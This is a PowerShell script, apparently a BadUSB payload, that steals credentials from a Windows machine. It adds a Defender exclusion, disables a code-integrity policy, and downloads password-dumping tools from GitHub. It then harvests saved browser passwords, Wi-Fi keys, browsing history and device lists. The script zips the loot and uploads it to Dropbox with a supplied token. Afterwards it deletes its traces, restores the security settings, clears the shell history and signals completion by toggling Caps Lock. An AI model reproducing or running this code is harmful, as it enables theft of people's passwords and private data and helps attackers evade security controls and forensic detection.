#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / / 
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateScript({ -not [string]::IsNullOrWhiteSpace($_) })]
    [string]$DropboxToken
)

$basePath   = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(Get-Date -f yyyy-MM-dd)"
$dumpFile   = "$dumpFolder.zip"

# Create directories
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
  -Name "VerifiedAndReputablePolicyState" `
  -Type DWord `
  -Value 0
CiTool --refresh --json

# Download tools
Invoke-WebRequest "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true" -OutFile WirelessKeyView.exe
Invoke-WebRequest "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true" -OutFile WebBrowserPassView.exe
Invoke-WebRequest "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true" -OutFile BrowsingHistoryView.exe
Invoke-WebRequest "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true" -OutFile WNetWatcher.exe

# Execute collection tools
.\WNetWatcher.exe /stext connected_devices.txt
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
.\WebBrowserPassView.exe /stext passwords.txt
.\WirelessKeyView.exe /stext wifi.txt

# Wait for files
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
    Start-Sleep -Seconds 1
}

Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"

# Compress
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# --- Dropbox upload ---
if ([string]::IsNullOrWhiteSpace($DropboxToken)) {
    exit 1
}

$dropboxPath = "/BadUSB/$env:COMPUTERNAME-$env:USERNAME-$(Get-Date -f yyyy-MM-dd_HH-mm-ss).zip"
$apiArg = @{
    path = $dropboxPath
    mode = "add"
    autorename = $true
    mute = $false
} | ConvertTo-Json -Compress

$headers = @{
    "Authorization"   = "Bearer $DropboxToken"
    "Dropbox-API-Arg" = $apiArg
    "Content-Type"    = "application/octet-stream"
}

try {
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
        -Method Post `
        -Headers $headers `
        -InFile $dumpFile `
        -ErrorAction Stop | Out-Null
} catch {
    # silent fail Ч как в оригинале
}

# --- Cleanup ---
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts -ErrorAction SilentlyContinue
Remove-Item "C:\Users\Public\Documents\ps.ps1" -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents" -Force -ErrorAction SilentlyContinue
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
  -Name "VerifiedAndReputablePolicyState" `
  -Type DWord `
  -Value 1
CiTool --refresh --json

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit